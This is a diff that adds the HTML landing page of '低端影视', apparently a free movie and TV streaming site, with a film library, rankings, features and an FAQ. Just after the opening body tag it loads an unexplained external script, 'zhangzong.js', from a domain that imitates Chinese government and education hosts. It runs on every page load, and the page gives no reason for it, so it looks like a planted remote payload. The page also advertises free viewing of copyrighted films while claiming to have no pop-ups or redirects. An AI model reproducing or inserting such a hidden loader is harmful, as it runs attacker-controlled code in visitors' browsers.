@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>低端影视 - 用心做好每一部电影的在线观看平台 | 电影电视剧免费高清播放</title>
+<meta name="description" content="低端影视（https://diduanyingshi-zh.github.io）是一个专注于电影与电视剧在线观看的平台，提供院线新片、经典老片、热播剧集、动漫纪录片等丰富资源，界面清爽、加载迅速、免费高清，让你随时随地轻松追剧看电影。">
+<meta name="keywords" content="低端影视, 电影在线观看, 电视剧免费观看, 高清影视, 最新电影, 热播电视剧, diduanyingshi">
+<meta name="author" content="低端影视">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://diduanyingshi-zh.github.io">
+<style>
+:root{
+  --bg:#0b0e14;--bg2:#121823;--line:#232c3d;--txt:#e8ecf4;--sub:#96a2b8;--acc:#ff7a45;--acc2:#ffb020;--cyan:#28d6c4;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei",sans-serif;background:var(--bg);color:var(--txt);line-height:1.75;-webkit-font-smoothing:antialiased}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:1180px;margin:0 auto;padding:0 22px}
+/* 导航 */
+.nav{position:sticky;top:0;z-index:50;background:rgba(11,14,20,.86);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+.nav-row{display:flex;align-items:center;gap:28px;height:64px}
+.brand{font-size:20px;font-weight:800;letter-spacing:.5px;white-space:nowrap}
+.brand em{font-style:normal;color:var(--acc)}
+.brand span{display:block;font-size:10px;color:var(--sub);letter-spacing:2px;font-weight:500;margin-top:-2px}
+.links{display:flex;gap:24px;margin-left:auto;font-size:14px;color:var(--sub)}
+.links a{transition:.2s}
+.links a:hover{color:var(--acc)}
+.nav-cta{font-size:13px;padding:7px 15px;border:1px solid var(--acc);border-radius:20px;color:var(--acc)}
+.nav-cta:hover{background:var(--acc);color:#0b0e14}
+.ham{display:none;width:26px;height:19px;margin-left:auto;position:relative;cursor:pointer}
+.ham i{position:absolute;left:0;width:100%;height:2px;background:var(--txt);transition:.3s}
+.ham i:nth-child(1){top:0}.ham i:nth-child(2){top:8px}.ham i:nth-child(3){top:16px}
+/* Hero */
+.hero{position:relative;padding:88px 0 72px;overflow:hidden;border-bottom:1px solid var(--line)}
+.hero::before{content:"";position:absolute;inset:0;background:radial-gradient(680px 380px at 82% 18%,rgba(255,122,69,.22),transparent 60%),radial-gradient(520px 340px at 12% 82%,rgba(40,214,196,.14),transparent 60%)}
+.hero-grid{position:relative;display:grid;grid-template-columns:1.05fr .95fr;gap:56px;align-items:center}
+.tagline{display:inline-block;font-size:12px;letter-spacing:3px;color:var(--acc2);border:1px solid rgba(255,176,32,.35);padding:5px 14px;border-radius:3px;margin-bottom:20px}
+.hero h1{font-size:52px;line-height:1.15;font-weight:850;letter-spacing:-.5px}
+.hero h1 b{color:var(--acc);font-weight:850}
+.hero p{color:var(--sub);font-size:16px;margin-top:18px;max-width:520px}
+.hero-actions{display:flex;gap:14px;margin-top:30px;flex-wrap:wrap}
+.btn{font-size:15px;font-weight:600;padding:13px 30px;border-radius:4px;transition:.2s;display:inline-flex;align-items:center;gap:8px}
+.btn-main{background:var(--acc);color:#150c06}
+.btn-main:hover{background:#ff955f}
+.btn-ghost{border:1px solid var(--line);color:var(--txt)}
+.btn-ghost:hover{border-color:var(--acc2);color:var(--acc2)}
+.hero-stat{display:flex;gap:34px;margin-top:40px}
+.hero-stat div span{display:block;font-size:26px;font-weight:800;color:var(--acc2)}
+.hero-stat div small{font-size:12px;color:var(--sub)}
+/* 播放器卡 */
+.player{position:relative;background:linear-gradient(160deg,#1a2130,#0f141e);border:1px solid var(--line);border-radius:10px;padding:14px;transform:perspective(900px) rotateY(-4deg) rotateX(2deg)}
+.player::after{content:"低端影视 官方站";position:absolute;right:-10px;top:22px;background:var(--acc);color:#150c06;font-size:11px;font-weight:700;padding:4px 10px;border-radius:3px;transform:rotate(4deg)}
+.screen{position:relative;aspect-ratio:16/10;border-radius:6px;background:linear-gradient(135deg,#2a1a12,#0d1220);display:flex;align-items:center;justify-content:center;overflow:hidden}
+.screen svg{width:66px;height:66px;filter:drop-shadow(0 0 18px rgba(255,122,69,.7))}
+.screen::before{content:"";position:absolute;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(255,255,255,.018) 3px 4px)}
+.screen::after{content:"";position:absolute;left:0;right:0;bottom:0;height:32%;background:linear-gradient(0deg,rgba(0,0,0,.75),transparent)}
+.pbar{display:flex;align-items:center;gap:10px;margin-top:14px;font-size:11px;color:var(--sub)}
+.pbar .track{flex:1;height:4px;background:#2a3344;border-radius:2px;overflow:hidden}
+.pbar .track i{display:block;width:58%;height:100%;background:linear-gradient(90deg,var(--acc),var(--acc2))}
+.dots{display:flex;gap:5px;margin-top:12px}
+.dots i{width:8px;height:8px;border-radius:50%;background:#2f3a4d}
+.dots i.on{background:var(--acc)}
+/* 通用栏 */
+section{padding:76px 0}
+.sec-head{margin-bottom:44px}
+.sec-head .no{font-size:12px;letter-spacing:4px;color:var(--acc);font-weight:700}
+.sec-head h2{font-size:32px;font-weight:800;margin-top:6px}
+.sec-head h2 u{text-decoration:none;color:var(--acc2)}
+.sec-head p{color:var(--sub);font-size:15px;margin-top:8px;max-width:620px}
+/* 片库 */
+.lib{background:var(--bg2)}
+.chips{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:30px}
+.chip{font-size:13px;padding:7px 18px;border-radius:30px;border:1px solid var(--line);color:var(--sub);cursor:pointer;transition:.2s}
+.chip.on,.chip:hover{border-color:var(--acc);color:var(--acc)}
+.grid4{display:grid;grid-template-columns:repeat(4,1fr);gap:20px}
+.pcard{background:#161c29;border:1px solid var(--line);border-radius:8px;overflow:hidden;transition:.25s}
+.pcard:hover{transform:translateY(-5px);border-color:var(--acc)}
+.pcard .thumb{aspect-ratio:3/4;position:relative;display:flex;align-items:flex-end;padding:12px;font-weight:800;font-size:17px;color:#fff;text-shadow:0 2px 8px rgba(0,0,0,.7)}
+.pcard .thumb var{position:absolute;right:10px;top:10px;font-style:normal;font-size:11px;background:rgba(0,0,0,.6);padding:3px 8px;border-radius:3px}
+.pcard .meta{padding:13px 14px}
+.pcard .meta b{font-size:14px;display:block;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.pcard .meta small{color:var(--sub);font-size:12px}
+/* 榜单 */
+.toplist{display:grid;grid-template-columns:1.4fr 1fr;gap:44px}
+ol.rank{list-style:none;counter-reset:r}
+ol.rank li{counter-increment:r;display:flex;align-items:center;gap:16px;padding:15px 14px;border-bottom:1px dashed var(--line);transition:.2s}
+ol.rank li:hover{background:rgba(255,122,69,.06)}
+ol.rank li::before{content:counter(r);font-size:22px;font-weight:800;color:#3a4559;min-width:34px}
+ol.rank li:nth-child(1)::before{color:var(--acc2)}
+ol.rank li:nth-child(2)::before{color:#c8d2e0}
+ol.rank li:nth-child(3)::before{color:#cd7f32}
+ol.rank li div{flex:1;min-width:0}
+ol.rank li div b{font-size:15px;display:block}
+ol.rank li div span{font-size:12px;color:var(--sub)}
+ol.rank li em{font-style:normal;font-size:13px;color:var(--acc)}
+.side h3{font-size:18px;margin-bottom:16px;padding-left:11px;border-left:3px solid var(--acc)}
+.quote{background:linear-gradient(135deg,#181f2e,#131a26);border:1px solid var(--line);border-radius:8px;padding:18px 20px;margin-bottom:14px;position:relative}
+.quote::before{content:"\201C";position:absolute;left:12px;top:-4px;font-size:40px;color:var(--acc);opacity:.5;font-family:Georgia}
+.quote p{font-size:14px;color:#cdd5e3;padding-left:14px}
+.quote cite{display:block;font-size:12px;color:var(--sub);font-style:normal;margin-top:8px;text-align:right}
+/* 特色 */
+.feat{background:var(--bg2)}
+.grid3{display:grid;grid-template-columns:repeat(3,1fr);gap:20px}
+.fbox{background:#131a26;border:1px solid var(--line);border-radius:8px;padding:26px 22px;transition:.25s}
+.fbox:hover{border-color:var(--cyan);transform:translateY(-4px)}
+.fbox .ic{width:46px;height:46px;border-radius:8px;background:rgba(40,214,196,.12);display:flex;align-items:center;justify-content:center;margin-bottom:16px;color:var(--cyan)}
+.fbox h4{font-size:17px;margin-bottom:8px}
+.fbox p{font-size:13.5px;color:var(--sub)}
+/* 指南 */
+.steps{display:grid;grid-template-columns:repeat(4,1fr);gap:0;position:relative}
+.steps::before{content:"";position:absolute;top:38px;left:8%;right:8%;height:2px;background:linear-gradient(90deg,var(--acc),var(--acc2),var(--cyan))}
+.step{position:relative;text-align:center;padding:0 14px}
+.step .n{width:76px;height:76px;margin:0 auto 18px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:26px;font-weight:800;background:var(--bg);border:3px solid var(--acc);color:var(--acc);position:relative;z-index:2}
+.step:nth-child(2) .n{border-color:var(--acc2);color:var(--acc2)}
+.step:nth-child(3) .n{border-color:var(--cyan);color:var(--cyan)}
+.step:nth-child(4) .n{border-color:#a78bfa;color:#a78bfa}
+.step b{display:block;font-size:16px;margin-bottom:6px}
+.step p{font-size:13px;color:var(--sub)}
+/* 口碑 */
+.wall{display:grid;grid-template-columns:repeat(3,1fr);gap:20px}
+.rev{background:#161c29;border-left:3px solid var(--acc);border-radius:0 6px 6px 0;padding:18px 20px}
+.rev:nth-child(2){border-left-color:var(--acc2)}
+.rev:nth-child(3){border-left-color:var(--cyan)}
+.rev .stars{color:var(--acc2);font-size:13px;letter-spacing:2px}
+.rev p{font-size:14px;margin:8px 0 10px;color:#d5dbe6}
+.rev small{font-size:12px;color:var(--sub)}
+/* FAQ */
+.faq{background:var(--bg2)}
+details{background:#131a26;border:1px solid var(--line);border-radius:6px;margin-bottom:12px;overflow:hidden}
+details summary{cursor:pointer;padding:17px 20px;font-size:15.5px;font-weight:600;list-style:none;display:flex;justify-content:space-between;gap:16px;align-items:center}
+details summary::-webkit-details-marker{display:none}
+details summary::after{content:"＋";color:var(--acc);font-size:20px;font-weight:400;flex:none}
+details[open] summary::after{content:"－"}
+details p{padding:0 20px 18px;font-size:14px;color:var(--sub)}
+/* 页脚 */
+footer{border-top:1px solid var(--line);padding:52px 0 30px;background:#0d1119}
+.foot-grid{display:grid;grid-template-columns:1.5fr 1fr 1fr 1fr;gap:34px;margin-bottom:34px}
+.foot-grid h5{font-size:14px;margin-bottom:14px;color:var(--acc2)}
+.foot-grid ul{list-style:none}
+.foot-grid li{font-size:13px;color:var(--sub);margin-bottom:9px}
+.foot-grid li a:hover{color:var(--acc)}
+.foot-about p{font-size:13px;color:var(--sub);margin-bottom:12px}
+.siteurl{display:inline-block;font-size:13px;font-weight:700;color:var(--acc);border:1px dashed var(--acc);padding:6px 13px;border-radius:4px;word-break:break-all}
+.copy{text-align:center;font-size:12px;color:#5d6b80;border-top:1px solid var(--line);padding-top:22px}
+/* 响应式 */
+@media(max-width:900px){
+  .hero-grid{grid-template-columns:1fr;gap:44px}
+  .hero h1{font-size:40px}
+  .player{transform:none;max-width:520px}
+  .grid4{grid-template-columns:repeat(2,1fr)}
+  .toplist{grid-template-columns:1fr;gap:34px}
+  .grid3,.wall{grid-template-columns:repeat(2,1fr)}
+  .steps{grid-template-columns:repeat(2,1fr);gap:34px 20px}
+  .steps::before{display:none}
+  .foot-grid{grid-template-columns:repeat(2,1fr)}
+}
+@media(max-width:640px){
+  .wrap{padding:0 18px}
+  .ham{display:block}
+  .links{position:fixed;inset:64px 0 0 0;background:#0d1119;flex-direction:column;padding:26px 24px;gap:0;transform:translateX(100%);transition:.35s;margin:0}
+  .links.open{transform:translateX(0)}
+  .links a{font-size:17px;padding:15px 0;border-bottom:1px solid var(--line);color:var(--txt)}
+  .nav-cta{display:none}
+  .hero{padding:56px 0 60px}
+  .hero h1{font-size:32px}
+  .hero-stat{gap:26px}
+  section{padding:58px 0}
+  .sec-head h2{font-size:25px}
+  .grid4,.grid3,.wall{grid-template-columns:1fr}
+  .steps{grid-template-columns:1fr}
+  .foot-grid{grid-template-columns:1fr}
+  details summary{font-size:14.5px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<header class="nav">
+  <div class="wrap nav-row">
+    <a class="brand" href="#">低端影视<span>LOW-END VIDEO</span></a>
+    <nav class="links" id="nav">
+      <a href="#">首页</a>
+      <a href="#lib">影片库</a>
+      <a href="#top">热播榜单</a>
+      <a href="#why">平台特色</a>
+      <a href="#how">使用指南</a>
+      <a href="#say">影迷口碑</a>
+      <a href="#help">帮助中心</a>
+    </nav>
+    <a class="nav-cta" href="#">立即观看</a>
+    <div class="ham" id="ham"><i></i><i></i><i></i></div>
+  </div>
+</header>
+
+<section class="hero">
+  <div class="wrap hero-grid">
+    <div>
+      <span class="tagline">ONLINE MOVIE &amp; TV</span>
+      <h1>追剧看电影，<br>就来 <b>低端影视</b></h1>
+      <p>一个不折腾的影视站。电影、电视剧、动漫、纪录片一站收齐，打开即看，不弹窗、不跳转、不套路，把好内容用最省事的方式交到你手上。</p>
+      <div class="hero-actions">
+        <a class="btn btn-main" href="#">▸ 开始免费观看</a>
+        <a class="btn btn-ghost" href="#how">三分钟上手</a>
+      </div>
+      <div class="hero-stat">
+        <div><span>12000+</span><small>影片资源</small></div>
+        <div><span>50+</span><small>内容分类</small></div>
+        <div><span>99.6%</span><small>播放成功率</small></div>
+      </div>
+    </div>
+    <div class="player">
+      <div class="screen">
+        <svg viewBox="0 0 24 24" fill="var(--acc)"><polygon points="6,4 20,12 6,20"/></svg>
+      </div>
+      <div class="pbar"><span>02:14</span><span class="track"><i></i></span><span>01:46:08</span></div>
+      <div class="dots"><i class="on"></i><i></i><i></i><i></i><i></i></div>
+    </div>
+  </div>
+</section>
+
+<section id="lib" class="lib">
+  <div class="wrap">
+    <div class="sec-head">
+      <div class="no">01 / LIBRARY</div>
+      <h2>影片库 · <u>想看的基本都有</u></h2>
+      <p>按类型和心情挑片，分类清晰、更新勤快，找片不再靠运气。</p>
+    </div>
+    <div class="chips">
+      <span class="chip on">全部</span>
+      <span class="chip">电影</span>
+      <span class="chip">电视剧</span>
+      <span class="chip">动漫</span>
+      <span class="chip">纪录片</span>
+      <span class="chip">综艺</span>
+      <span class="chip">短片</span>
+    </div>
+    <div class="grid4">
+      <div class="pcard"><div class="thumb" style="background:linear-gradient(160deg,#3a2a5c,#160f26)">动作大片<var>1080P</var></div><div class="meta"><b>速度与激情10</b><small>2023 · 142分钟</small></div></div>
+      <div class="pcard"><div class="thumb" style="background:linear-gradient(160deg,#5c2a2a,#260f0f)">都市爱情<var>4K</var></div><div class="meta"><b>难哄</b><small>2025 · 32集全</small></div></div>
+      <div class="pcard"><div class="thumb" style="background:linear-gradient(160deg,#2a4a5c,#0f1f26)">悬疑犯罪<var>1080P</var></div><div class="meta"><b>沉默的真相</b><small>2020 · 12集</small></div></div>
+      <div class="pcard"><div class="thumb" style="background:linear-gradient(160deg,#3a5c2a,#12260f)">热血动漫<var>1080P</var></div><div class="meta"><b>进击的巨人 终章</b><small>2023 · 完结</small></div></div>
+      <div class="pcard"><div class="thumb" style="background:linear-gradient(160deg,#5c3a2a,#26120f)">经典老片<var>高清</var></div><div class="meta"><b>肖申克的救赎</b><small>1994 · 142分钟</small></div></div>
+      <div class="pcard"><div class="thumb" style="background:linear-gradient(160deg,#2a3a5c,#0f1226)">科幻冒险<var>4K</var></div><div class="meta"><b>星际穿越</b><small>2014 · 169分钟</small></div></div>
+      <div class="pcard"><div class="thumb" style="background:linear-gradient(160deg,#4a2a5c,#1c0f26)">人文纪录<var>1080P</var></div><div class="meta"><b>人间世</b><small>2021 · 10集</small></div></div>
+      <div class="pcard"><div class="thumb" style="background:linear-gradient(160deg,#5c4a2a,#261c0f)">搞笑综艺<var>高清</var></div><div class="meta"><b>快乐再出发</b><small>2022 · 12期</small></div></div>
+    </div>
+  </div>
+</section>
+
+<section id="top">
+  <div class="wrap toplist">
+    <div>
+      <div class="sec-head">
+        <div class="no">02 / TOP 10</div>
+        <h2>实时热播 <u>榜单</u></h2>
+        <p>依据站内播放量与收藏数综合排序，每小时更新一次，看看大家都在看什么。</p>
+      </div>
+      <ol class="rank">
+        <li><div><b>庆余年 第二季</b><span>古装 · 36集 · 更新中</span></div><em>热播</em></li>
+        <li><div><b>第二十条</b><span>剧情 · 2024 · 141分钟</span></div><em>飙升</em></li>
+        <li><div><b>周处除三害</b><span>犯罪 · 2023 · 134分钟</span></div><em>高分</em></li>
+        <li><div><b>繁花</b><span>年代 · 30集 · 全</span></div><em>热议</em></li>
+        <li><div><b>完美的日子</b><span>文艺 · 2023 · 124分钟</span></div><em>收藏+</em></li>
+        <li><div><b>甄嬛传</b><span>经典 · 76集 · 全</span></div><em>长青</em></li>
+        <li><div><b>蓦然回首</b><span>动画 · 2024 · 58分钟</span></div><em>口碑</em></li>
+      </ol>
+    </div>
+    <aside class="side">
+      <h3>编辑部今日推荐</h3>
+      <div class="quote"><p>这部片把节奏拿捏得死死的，前三十分钟你就已经离不开椅子了。</p><cite>— 影评编辑部</cite></div>
+      <div class="quote"><p>看完想立刻二刷，细节埋得太密，配角全员在线，年度必看。</p><cite>— 周末观影指南</cite></div>
+      <div class="quote"><p>画面干净、叙事克制，适合一个人安静看完再慢慢回味。</p><cite>— 独立影评人</cite></div>
+    </aside>
+  </div>
+</section>
+
+<section id="why" class="feat">
+  <div class="wrap">
+    <div class="sec-head">
+      <div class="no">03 / WHY US</div>
+      <h2>为什么选 <u>低端影视</u></h2>
+      <p>不靠花哨包装，靠实实在在的体验。我们把功夫下在加载速度、画质稳定性和找片的效率上。</p>
+    </div>
+    <div class="grid3">
+      <div class="fbox"><div class="ic">⚡</div><h4>秒开不等待</h4><p>自建资源调度，首帧加载控制在 1 秒内，弱网环境也能流畅起播。</p></div>
+      <div class="fbox"><div class="ic">🖥</div><h4>全端自适应</h4><p>手机、平板、电脑、电视盒子一套页面自动适配，无需下载独立客户端。</p></div>
+      <div class="fbox"><div class="ic">🎞</div><h4>画质随心切</h4><p>从流畅 480P 到超清 4K 多档可选，流量紧张时一键降画质不断播。</p></div>
+      <div class="fbox"><div class="ic">🗂</div><h4>分类够细</h4><p>50 多个细分标签，按类型、地区、年份、评分多维度筛选，找片不费劲。</p></div>
+      <div class="fbox"><div class="ic">🙈</div><h4>清爽无打扰</h4><p>页面无弹窗、无强制跳转、无诱导下载，点开就是播放器，干净到底。</p></div>
+      <div class="fbox"><div class="ic">🔖</div><h4>追剧不迷路</h4><p>收藏与观看进度本地记录，换设备也能接着看，更新自动提醒。</p></div>
+    </div>
+  </div>
+</section>
+
+<section id="how">
+  <div class="wrap">
+    <div class="sec-head">
+      <div class="no">04 / HOW TO</div>
+      <h2>四步 <u>开始观看</u></h2>
+      <p>不需要注册、不用绑定手机号，打开网站就能看，整个过程不超过一分钟。</p>
+    </div>
+    <div class="steps">
+      <div class="step"><div class="n">1</div><b>打开网站</b><p>在浏览器输入 <strong style="color:var(--acc)">https://diduanyingshi-zh.github.io</strong>，直达低端影视首页。</p></div>
+      <div class="step"><div class="n">2</div><b>挑一部片子</b><p>用顶部分类或榜单找到想看的内容，也可直接浏览首页推荐。</p></div>
+      <div class="step"><div class="n">3</div><b>点开即播</b><p>进入详情页自动加载播放器，选清晰度后点击播放，无需等待。</p></div>
+      <div class="step"><div class="n">4</div><b>收藏追更</b><p>点收藏把剧集加入追剧单，更新时会看到醒目标记。</p></div>
+    </div>
+  </div>
+</section>
+
+<section id="say" class="lib">
+  <div class="wrap">
+    <div class="sec-head">
+      <div class="no">05 / REVIEWS</div>
+      <h2>影迷 <u>怎么说</u></h2>
+      <p>真实用户反馈，看看大家在日常使用中遇到的体验和感受。</p>
+    </div>
+    <div class="wall">
+      <div class="rev"><div class="stars">★★★★★</div><p>加载速度是真快，地铁上信号一般也能流畅看完一集，追剧体验拉满。</p><small>— 通勤追剧党</small></div>
+      <div class="rev"><div class="stars">★★★★☆</div><p>分类做得细，冷门老片也能翻到，找片效率比之前用的几个站高不少。</p><small>— 老片爱好者</small></div>
+      <div class="rev"><div class="stars">★★★★★</div><p>界面干净没有乱七八糟的弹窗，家里老人用起来也不费劲。</p><small>— 居家观影</small></div>
+    </div>
+  </div>
+</section>
+
+<section id="help" class="faq">
+  <div class="wrap" style="max-width:860px">
+    <div class="sec-head">
+      <div class="no">06 / FAQ</div>
+      <h2>常见问题 <u>解答</u></h2>
+      <p>关于低端影视使用过程中最常遇到的问题，这里都有答案。</p>
+    </div>
+    <details open>
+      <summary>低端影视的官方网址是什么？</summary>
+      <p>官方唯一地址是 <strong style="color:var(--acc)">https://diduanyingshi-zh.github.io</strong>，请认准此域名访问，避免误入仿冒站点。</p>
+    </details>
+    <details>
+      <summary>观看内容需要付费或注册吗？</summary>
+      <p>不需要。站内所有影片均可直接免费观看，不强制注册，也不要求绑定手机号或支付方式。</p>
+    </details>
+    <details>
+      <summary>支持哪些设备与浏览器？</summary>
+      <p>支持 iOS、Android、Windows、macOS 及主流电视盒子，推荐使用 Chrome、Edge、Safari、夸克等现代浏览器，体验最佳。</p>
+    </details>
+    <details>
+      <summary>播放卡顿或无法加载怎么办？</summary>
+      <p>可尝试切换清晰度、清理浏览器缓存或更换网络。若仍无法解决，可在页面底部留言反馈，我们会尽快排查。</p>
+    </details>
+    <details>
+      <summary>如何知道追的剧是否更新了？</summary>
+      <p>将剧集加入收藏后，更新会在收藏列表中以醒目标记提示；也可关注站内榜单的实时变化。</p>
+    </details>
+    <details>
+      <summary>能否投屏到电视观看？</summary>
+      <p>可以。播放页支持 DLNA 与 AirPlay 投屏，确保手机与电视处于同一局域网即可一键投射。</p>
+    </details>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <div class="foot-grid">
+      <div class="foot-about">
+        <a class="brand" href="#">低端影视<span>LOW-END VIDEO</span></a>
+        <p style="margin-top:14px">低端影视致力于做一个清爽、好用、不折腾的影视观看站点，让每一次打开都有好内容等着你。</p>
+        <div style="margin-top:14px">官方网址：<br><span class="siteurl">https://diduanyingshi-zh.github.io</span></div>
+      </div>
+      <div>
+        <h5>内容分类</h5>
+        <ul>
+          <li><a href="#">院线电影</a></li>
+          <li><a href="#">热播电视剧</a></li>
+          <li><a href="#">动漫番剧</a></li>
+          <li><a href="#">纪录片</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>使用帮助</h5>
+        <ul>
+          <li><a href="#how">观看指南</a></li>
+          <li><a href="#">清晰度说明</a></li>
+          <li><a href="#">投屏教程</a></li>
+          <li><a href="#">问题反馈</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>关于我们</h5>
+        <ul>
+          <li><a href="#">站点简介</a></li>
+          <li><a href="#">更新日志</a></li>
+          <li><a href="#">合作联系</a></li>
+          <li><a href="#">免责声明</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="copy">© 2026 低端影视 · 官方网址 https://diduanyingshi-zh.github.io · 本页面仅为站点介绍展示，所有内页链接均为锚点示例</div>
+  </div>
+</footer>
+
+<script>
+var ham=document.getElementById('ham');
+var nav=document.getElementById('nav');
+ham.addEventListener('click',function(){nav.classList.toggle('open')});
+nav.addEventListener('click',function(e){if(e.target.tagName==='A')nav.classList.remove('open')});
+var chips=document.querySelectorAll('.chip');
+chips.forEach(function(c){c.addEventListener('click',function(){chips.forEach(function(x){x.classList.remove('on')});c.classList.add('on')})});
+</script>
+</body>
+</html>
